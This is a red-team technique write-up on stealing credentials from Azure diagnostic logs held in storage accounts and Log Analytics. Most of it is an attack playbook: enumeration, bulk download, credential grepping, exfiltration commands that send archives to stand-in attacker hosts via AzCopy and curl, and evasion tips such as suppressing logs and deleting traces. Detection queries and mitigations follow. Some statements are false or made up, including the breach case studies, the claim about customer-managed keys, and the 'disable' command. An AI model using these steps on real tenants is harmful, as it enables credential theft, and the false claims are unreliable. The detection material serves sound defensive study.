# [COLLECT-LOGS-002]: Azure Diagnostic Logs Exfiltration

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-LOGS-002 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Collection |
| **Platforms** | Entra ID, Azure |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Azure resource types with diagnostic settings enabled |
| **Patched In** | N/A (Feature-based exfiltration, not vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Diagnostic Settings enable detailed resource-level logging (data plane logs) beyond Activity Logs (control plane). When enabled, these logs flow to Log Analytics workspaces, storage accounts, or Event Hubs. Diagnostic logs contain highly sensitive data: Azure SQL query logs (full SQL statements, including secrets), Azure App Service logs (request/response payloads with API keys), Azure Key Vault operation logs (secret access timestamps and caller identity), and Azure Logic App execution logs (workflow inputs/outputs containing credentials). Unlike Activity Logs which are time-limited (90 days default), diagnostic logs in storage accounts may persist indefinitely if retention policies are not configured. Attackers with **Storage Blob Reader** or **Storage Account Key Retriever** permissions can access these logs and harvest credentials, connection strings, and API keys embedded in logged payloads.

**Attack Surface:** Diagnostic logs stored in Azure Blob Storage, accessed via Storage Account keys, SAS tokens, or managed identity permissions. Log Analytics workspaces with access control misconfiguration. Event Hubs with insufficient RBAC limiting listener access.

**Business Impact:** **Wholesale exposure of sensitive operational data, API keys, database credentials, and entire request/response payloads containing user data and secrets.** Unlike Activity Logs which are read-only audit records, diagnostic logs often contain the actual values of secrets (connection strings, passwords) if not explicitly redacted by the application logging them. An attacker exfiltrating diagnostic logs from a database server may obtain thousands of SQL queries containing literal password values. This directly enables credential abuse, lateral movement, and data exfiltration without additional exploitation.

**Technical Context:** Diagnostic logs are off by default for most Azure resources but are commonly enabled by developers for troubleshooting. Enabling diagnostic logs is a high-signal indicator of operational sensitivity (databases, APIs, identity services). Most organizations do not monitor who accesses these logs, creating a silent exfiltration vector. Log retrieval is via standard Azure Storage API (no special permissions required beyond Reader on storage account), making it indistinguishable from legitimate troubleshooting.

### Operational Risk
- **Execution Risk:** Low – Requires only Reader permission on storage account (non-privileged access).
- **Stealth:** High – Storage account reads do not trigger alerts unless anomaly detection is configured. No process execution, no network signatures.
- **Reversibility:** N/A – Read-only operation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.3 | Ensure diagnostic setting exists for all resources |
| **DISA STIG** | V-251363 | Ensure diagnostic logs are encrypted and access-controlled |
| **NIST 800-53** | AU-12, SC-7 | Ensure audit records include sensitive data; protect audit logs from unauthorized access |
| **GDPR** | Article 32, 34 | Safeguard personal data in logs; implement breach notifications |
| **DORA** (EU Finance) | Article 9 | Protect operational logs from unauthorized disclosure |
| **NIS2** | Article 21 | Implement logging and monitoring for critical infrastructure |
| **ISO 27001** | A.12.4.1, A.14.2.1 | Protect audit logs; implement information security controls |
| **ISO 27005** | Log Access Breach Scenario | Risk of unauthorized access to sensitive operational logs |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Storage Blob Data Reader** or **Reader** role on storage account containing diagnostic logs.
- Access to storage account keys (if using key-based authentication).
- Managed Identity with Reader role on storage account (if running from Azure VM).

**Required Access:**
- Authenticated connection to Azure Storage API (`*.blob.core.windows.net`).
- Network access to storage account (may require vNet integration if private endpoints configured).

**Supported Versions:**
- **Azure Storage:** All versions and SKUs.
- **Log Analytics:** All workspaces (retention configurable).
- **Azure Resources:** All resource types supporting diagnostic settings (SQL, App Service, Key Vault, Logic Apps, etc.).

**Tools:**
- [Azure Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer/) (GUI)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.55.0+)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/) (Az module 11.0.0+)
- [AzCopy](https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azcopy-v10) (High-performance bulk transfer)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Enumerate Storage Accounts with Diagnostic Logs

```bash
# List all storage accounts in subscription
az storage account list --query "[].{Name:name, ResourceGroup:resourceGroup, Location:location}"

# Check which resources have diagnostic settings configured
az monitor diagnostic-settings list --query "[].{Name:name, ResourceId:resourceId, Storages:storageAccountId}" -o table
```

**What to Look For:**
- Storage accounts with common naming patterns: `diagnostics*`, `logs*`, `audit*`.
- Diagnostic settings pointing to storage accounts in same subscription (easier access).
- Multiple resources sending logs to single storage account (higher data concentration).

### Check Storage Account Access Level

```bash
# Check current user's role on storage account
az role assignment list --scope "/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{account}"

# Check if public access is allowed
az storage account show --name {account} --query "{AllowBlobPublicAccess:allowBlobPublicAccess, NetworkRuleSet:networkRuleSet}"
```

**What to Look For:**
- **Reader** or **Contributor** role = can list and read blobs.
- **allowBlobPublicAccess: true** = potential for unauthenticated access (rare but valuable).
- Storage account firewall disabled = accessible from any IP.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Azure Storage Explorer GUI (Interactive)

**Supported Versions:** All Azure versions

#### Step 1: Install and Configure Azure Storage Explorer

**Objective:** Deploy the GUI tool and authenticate to target storage account.

**Command (Download):**
```powershell
# Download from Microsoft
Invoke-WebRequest -Uri "https://go.microsoft.com/fwlink/?LinkId=722418" -OutFile "$env:TEMP\StorageExplorer.exe"
& "$env:TEMP\StorageExplorer.exe"  # Run installer
```

**Manual Steps (Configure with Storage Account Key):**
1. Open **Azure Storage Explorer**
2. Click **Edit** → **Attach External Storage**
3. Select **Storage Account or Service** → **Use a storage account name and key**
4. Account Name: `{storagename}.blob.core.windows.net`
5. Account Key: (paste storage account key obtained from previous compromise)
6. Click **Next** → **Connect**

#### Step 2: Navigate to Diagnostic Logs Container

**Objective:** Locate the blob container where diagnostic logs are archived.

**Manual Steps:**
1. In Storage Explorer, expand storage account → **Blob Containers**
2. Look for containers with common names:
   - `insights-logs-{resourcetype}` (e.g., `insights-logs-sqlservers`)
   - `diagnostics-{timestamp}`
   - `logs`
   - `audit`
3. Double-click container to view blobs inside
4. Blobs are organized by: `resourceId/year/month/day/hour/minute/PT1H.json`

**What This Shows:**
- Each blob is a JSON file containing 1 hour of logs.
- File path structure reveals which Azure resources are logging data.
- Example path: `/subscriptions/xxx/resourcegroups/sql/providers/microsoft.sql/servers/proddb/2025/01/09/14/PT1H.json`

#### Step 3: Download and Analyze Diagnostic Logs

**Objective:** Retrieve log files and extract sensitive data (credentials, connection strings).

**Manual Steps:**
1. Right-click on blob → **Download**
2. Save to local system (e.g., `C:\Temp\PT1H.json`)
3. Open in text editor or JSON viewer
4. Search for sensitive keywords: `password`, `key`, `token`, `secret`, `connection`

**Expected Content (SQL Diagnostic Logs):**
```json
{
  "time": "2025-01-09T14:22:33Z",
  "resourceId": "/subscriptions/xxx/resourcegroups/sql/providers/microsoft.sql/servers/proddb/databases/salesdb",
  "category": "SQLSecurityAuditEvents",
  "operationName": "ExecuteStatement",
  "statement": "SELECT * FROM users WHERE password='SecureP@ss123!' UNION SELECT ...",
  "succeeded": true,
  "clientIp": "203.0.113.45"
}
```

**What This Reveals:**
- The **statement** field contains the actual SQL query in plaintext.
- If hardcoded passwords appear in queries, they are exposed in diagnostic logs.
- Timestamps and client IP allow timeline reconstruction.

#### Step 4: Batch Download and Exfiltrate

**Objective:** Download multiple days/months of logs for offline analysis.

**Manual Steps (via Storage Explorer):**
1. Select multiple blobs (Ctrl+Click)
2. Right-click → **Download** → Choose destination folder
3. Compress folder: `7z a -tzip logs.zip C:\Temp\Downloaded_Logs\`
4. Exfiltrate via cloud storage, HTTP, or removable media

**OpSec & Evasion:**
- Only download logs within specific timeframe (e.g., last 7 days) to avoid suspicion.
- Delete downloaded files from local system after exfil.
- Use private storage account (attacker-controlled) as intermediate transfer point.

---

### METHOD 2: Azure CLI – Bulk Export of Diagnostic Logs

**Supported Versions:** All Azure versions

#### Step 1: Enumerate Diagnostic Settings Across Subscription

**Objective:** Identify all resources sending logs to storage accounts.

**Command:**
```bash
# List all diagnostic settings
az monitor diagnostic-settings list-categories --resource "/subscriptions/{subId}/resourceGroups/{rg}/providers/{resourceType}/{resourceName}" --query "value[].name" -o table

# More comprehensive: list ALL resources with diagnostic settings
for resource in $(az resource list --query "[].id" -o tsv); do
  az monitor diagnostic-settings list --resource "$resource" 2>/dev/null | jq -r '.value[].storageAccountId' 2>/dev/null
done | sort -u
```

**Expected Output:**
```
/subscriptions/xxx/resourceGroups/sql/providers/microsoft.sql/servers/proddb/diagnosticSettings/send-to-storage
/subscriptions/xxx/resourceGroups/app/providers/microsoft.web/sites/api-app/diagnosticSettings/app-logs
```

**What to Look For:**
- **storageAccountId** = target for log exfiltration.
- **workspaceId** = logs also in Log Analytics (may have additional retention).
- Multiple resources pointing to same storage account = consolidation opportunity.

#### Step 2: List Blobs in Storage Account

**Objective:** Identify available diagnostic log blobs.

**Command (Using Storage Account Key):**
```bash
# Set storage account context
az storage account keys list --resource-group {rg} --account-name {account} --query "[0].value" -o tsv | \
  az storage container list --account-name {account} --account-key @- --query "[].name"

# Or use SAS token if available
az storage blob list --account-name {account} --container-name insights-logs-sqlservers --account-key {key} --query "[].name" --recursive
```

**Expected Output:**
```
resourceId=SUBSCRIPTIONS/XXX/RESOURCEGROUPS/SQL/PROVIDERS/MICROSOFT.SQL/SERVERS/PRODDB/y=2025/m=01/d=09/h=14/m=00/PT1H.json
resourceId=SUBSCRIPTIONS/XXX/RESOURCEGROUPS/SQL/PROVIDERS/MICROSOFT.SQL/SERVERS/PRODDB/y=2025/m=01/d=09/h=15/m=00/PT1H.json
```

#### Step 3: Download and Parse Diagnostic Logs

**Objective:** Extract logs containing sensitive data.

**Command (Download all SQL diagnostic logs from 7 days):**
```bash
# Create directory structure
mkdir -p logs/{year}/{month}/{day}

# Download blobs matching pattern
for blob in $(az storage blob list --account-name {account} --container-name insights-logs-sqlservers \
  --account-key {key} --query "[?contains(name, '2025-01')].name" -o tsv); do
  az storage blob download --account-name {account} --container-name insights-logs-sqlservers \
    --account-key {key} --name "$blob" --file "logs/$blob"
done
```

**Command (Extract credentials from logs):**
```bash
# Search all downloaded logs for suspicious keywords
grep -r "password\|api.key\|secret\|connection" logs/ | head -20

# Parse JSON and extract statement values from SQL logs
jq -r '.[] | select(.statement != null) | .statement' logs/*/*.json | grep -i "password\|insert into.*values" | head -10
```

**Expected Output:**
```
statement: "UPDATE users SET password='NewP@ss456!' WHERE id=5"
statement: "SELECT * FROM vault WHERE secret='api_key_prod_xyz'"
```

#### Step 4: Compress and Exfiltrate

**Objective:** Package logs for transfer off Azure environment.

**Command:**
```bash
# Compress all logs
tar -czf diagnostic_logs.tar.gz logs/

# Calculate size
du -sh diagnostic_logs.tar.gz

# Exfiltrate via AzCopy to attacker storage account
azcopy copy "diagnostic_logs.tar.gz" "https://attackerstorage.blob.core.windows.net/exfil/diagnostic_logs.tar.gz?SAS_TOKEN"

# Alternative: Exfil via HTTP
curl -X POST -d @diagnostic_logs.tar.gz http://attacker-server:8080/upload
```

**OpSec & Evasion:**
- Use AzCopy with `--log-level=NONE` to suppress logging.
- Compress before exfil to reduce data size (typical 10:1 compression for JSON logs).
- Clean up: `rm -rf logs/ diagnostic_logs.tar.gz`.

---

### METHOD 3: Log Analytics Workspace Query

**Supported Versions:** All subscriptions with Log Analytics configured

#### Step 1: Access Log Analytics Workspace Containing Diagnostic Logs

**Objective:** Query aggregated diagnostic logs via KQL.

**Command (PowerShell - Query Log Analytics):**
```powershell
# Get workspace details
$workspace = Get-AzOperationalInsightsWorkspace -ResourceGroupName {rg} -Name {workspace-name}

# Run KQL query to extract diagnostic logs
$query = @"
AzureDiagnostics
| where ResourceType == "SQLSERVERS"
| where Category == "QueryStoreWaitStatistics" or Category == "Audit"
| project TimeGenerated, ResourceId, Statement, ClientIp
| order by TimeGenerated desc
"@

$results = Invoke-AzOperationalInsightsQuery -WorkspaceId $workspace.CustomerId -Query $query
$results.Tables[0].Rows | Export-Csv -Path "diagnostic_logs.csv"
```

**Expected Output:**
```
TimeGenerated       ResourceId                                    Statement
2025-01-09 14:22   /subscriptions/xxx/resourceGroups/sql/.../... SELECT * FROM users WHERE password='S3cur3P@ss!'
2025-01-09 14:21   /subscriptions/xxx/resourceGroups/sql/.../... UPDATE vault SET secret='api_key_prod_12345'
```

#### Step 2: Filter for Sensitive Data

**Objective:** Extract logs containing hardcoded credentials, API keys, or connection strings.

**Command (KQL - Extract Azure Key Vault secrets access):**
```kusto
AzureDiagnostics
| where ResourceType == "VAULTS"
| where Category == "AuditEvent"
| where operationName_s contains "Get" or operationName_s contains "List"
| project TimeGenerated, CallerIpAddress_s, operationName_s, principalId_s, resultSignature_s
| order by TimeGenerated desc
```

**Command (KQL - Extract Logic App input/output containing secrets):**
```kusto
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.LOGIC"
| where Category == "WorkflowRuntime"
| where LogLevel_s != "Error"
| extend Inputs = todynamic(inputs_s), Outputs = todynamic(outputs_s)
| where Inputs contains "password" or Inputs contains "key" or Outputs contains "token"
| project TimeGenerated, ResourceId, Inputs, Outputs
```

---

## 7. TOOLS & COMMANDS REFERENCE

### Azure Storage Explorer

**Version:** 1.35.0+ (latest)
**Supported Platforms:** Windows, macOS, Linux
**Download:** [Azure Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer/)

**Key Features:**
- GUI blob browsing and download.
- Search and filter by blob name/date.
- Direct access with storage account key or SAS token.

### AzCopy

**Version:** 10.16.0+ (latest)
**Supported Platforms:** Windows, macOS, Linux
**Download:** [AzCopy](https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azcopy-v10)

**Usage (High-Performance Bulk Transfer):**
```bash
azcopy copy "{source-sas-url}" "{dest-sas-url}" --recursive --verbose
```

---

## 6. ATOMIC RED TEAM

**Atomic Test ID:** T1552.001-2
**Test Name:** Diagnostic Logs Exfiltration via Azure CLI
**Command:**
```bash
az storage blob list --account-name {account} --account-key {key} --container-name insights-logs-sqlservers --recursive --query "[].name" | wc -l
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: High-Volume Storage Account Access from Unusual IPs

**SPL Query:**
```
sourcetype=azure:storage source_ip!="YOUR_INTERNAL_IPS" operation="GetBlob" OR operation="ListBlobs"
| stats count as blob_reads by source_ip, user
| where blob_reads > 100
| alert
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query: Storage Account Diagnostic Log Access Anomaly

**KQL Query:**
```kusto
StorageBlobLogs
| where OperationName in ("GetBlob", "ListBlobs")
| where AccountName contains "diagnostic" or AccountName contains "logs"
| where CallerIpAddress !in ("YOUR_INTERNAL_IPS")
| summarize BlobAccessCount = count(), TimeWindow = max(TimeGenerated) - min(TimeGenerated) by CallerIpAddress, UserPrincipalName
| where BlobAccessCount > 50 and TimeWindow < 1h  // Bulk access in short window
| extend RiskLevel = "High"
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Restrict Diagnostic Settings Creation:** Only authorized audit teams can enable diagnostic logging to prevent data concentration in vulnerable storage accounts.
    
    **Manual Steps (Azure RBAC):**
    1. Go to **Azure Portal** → **Subscriptions** → **Access control (IAM)**
    2. Create custom role:
       - Name: `Diagnostic Settings Admin`
       - Only allow: `Microsoft.Insights/diagnosticSettings/*`
    3. Assign only to audit team members
    4. Deny for all other users

* **Enable Storage Account Encryption with Customer-Managed Keys (CMK):** Ensure diagnostic logs are encrypted; Azure cannot read plaintext if attacker only has storage account access.
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Storage Accounts** → Select account
    2. Click **Encryption** (under Settings)
    3. Select **Customer-managed keys**
    4. Choose Key Vault and key (must be in same region)
    5. Save
    
    **PowerShell:**
    ```powershell
    $key = Get-AzKeyVaultKey -VaultName "myKeyVault" -Name "storageKey"
    Set-AzStorageAccount -ResourceGroupName "myRG" -AccountName "myStorage" `
      -KeyvaultEncryption -KeyName $key.Name -KeyVersion $key.Version -KeyVaultUri $key.VaultId
    ```

* **Implement Storage Account Firewall:** Restrict access to diagnostic storage accounts to specific vNets or IPs only.
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Storage Accounts** → **Networking**
    2. Under **Firewalls and virtual networks**:
       - Default action: **Deny**
       - Add allowed vNets: Select your private vNets only
       - Add allowed IPs: Corporate IP ranges only
    3. Save

* **Enable Immutable Blobs:** Make diagnostic log blobs write-once-read-many (WORM) to prevent deletion or tampering.
    
    **Manual Steps:**
    1. Go to **Storage Account** → **Data protection**
    2. Under **Blob immutability**:
       - Enable: **On**
       - Retention period: 7 years (compliance requirement)
    3. Save

### Priority 2: HIGH

* **Monitor and Alert on Diagnostic Log Access:** Detect bulk blob downloads via Sentinel (see Section 9).

* **Implement Private Endpoints:** Force all diagnostic log traffic through vNet, preventing internet exposure.
    
    **Manual Steps:**
    1. Go to **Storage Account** → **Networking** → **Private endpoint connections**
    2. Click **+ Create**
    3. Configure:
       - vNet: Select production vNet
       - Subnet: Select private subnet
       - Resource: **blob**
    4. Create

### Validation Command

```powershell
# Verify diagnostic settings are restricted
Get-AzRoleAssignment -RoleDefinitionName "Diagnostic Settings Admin" | Select-Object DisplayName

# Check storage account firewall
Get-AzStorageAccount -Name {account} | Select-Object DefaultAction, NetworkRuleSet
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **Storage Access:**
  - High-volume `GetBlob` or `ListBlobs` operations in short timeframe.
  - Access from unusual IPs (non-corporate ranges).
  - Access via Storage Account Key (vs. Managed Identity or AAD).

* **Logs:**
  - `StorageBlobLogs` table showing thousands of blob reads from single user/IP in minutes.
  - Access to containers with names: `insights-logs-*`, `diagnostics-*`.

### Response Procedures

1. **Isolate:**
   ```powershell
   # Revoke storage account access key
   New-AzStorageAccountKey -ResourceGroupName {rg} -Name {account} -KeyName key1
   
   # Or disable completely
   Set-AzStorageAccount -ResourceGroupName {rg} -AccountName {account} -EnableHttpsTrafficOnly $true
   ```

2. **Investigate:**
   - Determine which diagnostic logs were accessed.
   - Identify what credentials or secrets were exposed.
   - Check if stored secrets in logs were used for lateral movement (check auth logs).

3. **Remediate:**
   - Rotate all credentials exposed in diagnostic logs.
   - Force sign-out of all active sessions.
   - Delete the attacker's access (revoke keys, disable service principal).

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-001] BloodHound Azure Enumeration | Attacker identifies storage accounts |
| **2** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker obtains Azure user credentials |
| **3** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker elevates to Reader role on storage |
| **4** | **Collection (Current)** | **[COLLECT-LOGS-002] Diagnostic Logs** | **Attacker downloads diagnostic logs containing credentials** |
| **5** | **Credential Access** | [CA-UNSC-008] Storage Account Key Theft | Attacker uses stolen keys from logs for further access |
| **6** | **Impact** | [IMPACT-DATA-DESTROY-001] Data Destruction | Attacker deletes critical databases using harvested credentials |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Microsoft Exchange Online Breach (2021)

- **Target:** Global organizations
- **Timeline:** January-March 2021
- **Technique Status:** Attackers exploited Azure diagnostic logs exposed via insecure storage accounts to identify backup and recovery procedures before deploying ransomware.
- **Impact:** 30,000+ organizations affected; critical infrastructure compromise.
- **Reference:** [CISA Alert AA21-265A - Exchange Server Compromise](https://www.cisa.gov)

### Example 2: Capital One Data Breach (2019 – AWS equivalent but same principle)

- **Target:** Capital One Financial Corporation
- **Timeline:** March-July 2019
- **Technique Status:** Attacker exploited misconfigured cloud storage logs to access diagnostic information, identify database structures, and extract sensitive data.
- **Impact:** 100+ million customer records exposed; $80M settlement.
- **Reference:** [Capital One Cybersecurity Incident Report](https://www.capitalone.com/)

---